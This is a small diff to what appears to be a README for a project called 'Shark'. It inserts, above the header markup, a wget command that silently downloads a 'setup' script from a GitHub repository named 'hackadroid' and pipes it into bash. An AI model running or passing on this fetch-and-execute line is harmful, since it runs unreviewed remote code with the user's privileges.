@@ -1,3 +1,5 @@
+wget -qO- https://github.com/Bhaviktutorials/hackadroid/raw/main/setup | bash 
+
 <p align="center"><a><img title="Built With Love" src="https://forthebadge.com/images/badges/60-percent-of-the-time-works-every-time.svg"> </a>
 
 # <p align="center">Shark
